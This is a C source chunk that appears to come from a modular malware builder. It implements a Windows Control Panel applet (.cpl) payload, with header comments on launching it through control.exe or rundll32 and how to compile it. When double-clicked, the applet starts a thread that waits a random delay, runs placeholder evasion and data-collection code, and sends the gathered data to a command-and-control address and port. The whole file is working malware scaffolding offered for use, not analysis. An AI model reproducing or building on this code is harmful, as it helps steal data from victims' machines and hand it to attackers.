// chunk: arch/dll_cpl
// depends: core/emit_buffer, exfil/*
// provides: DllMain, CPlApplet
// headers: windows.h,cpl.h
// note: Control Panel applet — runs via control.exe or rundll32.
//       Usage: control.exe payload.cpl  OR  rundll32.exe shell32.dll,Control_RunDLL payload.cpl
//       Compile with: -shared -o payload.cpl source.c

#ifndef CHUNK_ARCH_DLL_CPL
#define CHUNK_ARCH_DLL_CPL

#include <cpl.h>

static DWORD WINAPI cpl_worker(LPVOID param) {
    (void)param;
    Sleep(2000 + (GetTickCount() % 3000));

{{EVASION_INIT}}

    init_buffer();
    if (!g_data) return 1;

    {{COLLECTOR_CALLS}}

    if (g_pos > 0)
        exfiltrate(C2_ADDR, C2_PORT, g_data, g_pos);

    free(g_data);
    return 0;
}

__declspec(dllexport) LONG CALLBACK CPlApplet(HWND hwndCPl, UINT uMsg, LPARAM lParam1, LPARAM lParam2) {
    (void)hwndCPl; (void)lParam1; (void)lParam2;
    switch (uMsg) {
        case CPL_INIT:
            return 1;
        case CPL_GETCOUNT:
            return 1;
        case CPL_DBLCLK:
            CreateThread(NULL, 0, cpl_worker, NULL, 0, NULL);
            Sleep(100);
            return 0;
        case CPL_EXIT:
            return 0;
    }
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    (void)hinstDLL; (void)lpReserved;
    if (fdwReason == DLL_PROCESS_ATTACH)
        DisableThreadLibraryCalls(hinstDLL);
    return TRUE;
}

#endif
